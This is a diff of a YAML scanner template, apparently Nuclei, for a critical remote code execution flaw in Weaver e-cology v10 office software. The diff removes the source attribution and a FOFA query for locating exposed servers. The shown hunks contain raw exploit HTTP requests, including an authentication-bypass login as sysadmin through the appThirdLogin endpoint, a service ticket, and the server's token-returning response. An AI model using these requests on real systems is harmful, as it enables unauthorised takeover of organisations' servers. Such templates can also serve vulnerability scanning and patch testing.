@@ -3,12 +3,8 @@ info:
   name: 泛微e-cology v10远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gtiig4u3pphhvc93'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gtiig4u3pphhvc93
-    fofa: app="泛微-OA（e-cology）"
 http:
 - raw:
   - 'POST /papi/passport/rest/appThirdLogin HTTP/1.1
@@ -23,7 +19,6 @@ http:
 
 
     username=sysadmin&service=1&ip=1&loginType=third
-
 
 
     ----
@@ -77,7 +72,6 @@ http:
     stTicket=ST-591-hEd3zpL4xVLMTe9hJ0wR-http://10.0.0.1
 
 
-
     ----
 
     HTTP/1.1 200 OK
@@ -104,7 +98,6 @@ http:
 
 
     {"code":200,"msg":"接口返回成功","status":true,"data":"THIRD_def423a1574e66bbdb29bc647cd8ccf6","fail":false}
-
 
 
     **步骤三**'
